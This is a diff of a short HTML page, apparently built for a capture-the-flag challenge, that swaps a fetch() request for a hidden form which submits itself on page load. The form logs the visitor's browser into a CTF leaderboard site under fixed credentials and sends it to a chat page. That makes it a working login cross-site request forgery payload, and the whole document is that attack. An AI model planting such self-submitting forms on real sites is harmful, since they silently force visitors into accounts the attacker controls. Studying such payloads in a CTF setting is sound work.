@@ -1,19 +1,13 @@
 <!DOCTYPE html>
 <html>
 <body>
-<div class="message">x</div>
+<div class="message">loading...</div>
+<form id="f" method="POST" action="https://ctf.leaderboard.sorint.com/login?next=/chat/47">
+  <input name="username" value="doriangrey">
+  <input name="password" value="doriangrey">
+</form>
 <script>
-fetch('https://ctf.leaderboard.sorint.com/login', {
-  method: 'POST',
-  credentials: 'include',
-  mode: 'no-cors',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: 'username=doriangrey&password=doriangrey'
-}).then(() => {
-  setTimeout(() => {
-    window.location = 'https://ctf.leaderboard.sorint.com/chat/47';
-  }, 2000);
-});
+  document.getElementById('f').submit();
 </script>
 </body>
 </html>
